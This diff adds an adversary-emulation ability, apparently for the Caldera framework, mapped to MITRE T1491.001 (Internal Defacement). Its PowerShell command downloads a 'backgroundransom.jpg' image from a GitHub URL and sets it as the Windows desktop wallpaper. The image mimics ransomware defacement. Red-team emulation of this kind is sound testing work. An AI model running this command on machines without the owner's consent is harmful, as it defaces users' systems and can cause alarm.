@@ -1,0 +1,48 @@
+- executors:
+  - code: null
+    build_target: null
+    command: "$url = \"https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg\"\
+      ; \n$imgLocation = \"#{wallpaper_location}\"; \n$orgWallpaper = (Get-ItemProperty\
+      \ -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper;\
+      \ $orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"; $updateWallpapercode\
+      \ = @' ; using System.Runtime.InteropServices; namespace Win32{;     public\
+      \ class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\
+      \ ;          static extern int SystemParametersInfo (int uAction , int uParam\
+      \ , string lpvParam , int fuWinIni) ;          ;          public static void\
+      \ SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);\
+      \         };     }; } ; '@; $wc = New-Object System.Net.WebClient  ; try{  ;\
+      \     $wc.DownloadFile($url, $imgLocation);     add-type $updateWallpapercode\
+      \ ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; catch [System.Net.WebException]{\
+      \  ;     Write-Host(\"Cannot download $url\") ;     add-type $updateWallpapercode\
+      \ ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; finally{    ;   \
+      \  $wc.Dispose()  ; }"
+    payloads: []
+    uploads: []
+    name: psh
+    parsers:
+    - module: plugins.atomic.app.parsers.atomic_powershell
+      parserconfigs:
+      - source: validate_me
+        custom_parser_vals: {}
+    variations: []
+    language: null
+    cleanup: []
+    additional_info: {}
+    platform: windows
+    timeout: 60
+  access: {}
+  technique_id: T1491.001
+  description: 'Downloads an image from a GitHUB and change it, to define as wallpaper. '
+  repeatable: false
+  buckets:
+  - impact
+  singleton: false
+  name: change user Wallpaper
+  plugin: ''
+  requirements: []
+  delete_payload: true
+  tactic: impact
+  technique_name: 'Defacement: Internal Defacement'
+  privilege: ''
+  additional_info: {}
+  id: change_desktop_background
